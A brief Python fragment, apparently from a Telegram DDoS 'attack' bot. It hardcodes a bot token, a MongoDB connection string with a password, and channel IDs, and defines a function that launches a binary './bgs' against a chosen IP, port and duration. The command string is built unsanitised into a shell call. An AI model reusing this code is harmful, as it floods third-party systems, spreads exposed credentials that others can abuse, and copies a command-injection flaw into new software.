...
TOKEN = '7288492541:AAHs94yW9AglKPydCpwmaNwS9BhoAJEryzI'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
FORWARD_CHANNEL_ID = -1002423745743
CHANNEL_ID = -1002423745743
error_channel_id = -1002423745743
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgs {target_ip} {target_port} {duration} 100")
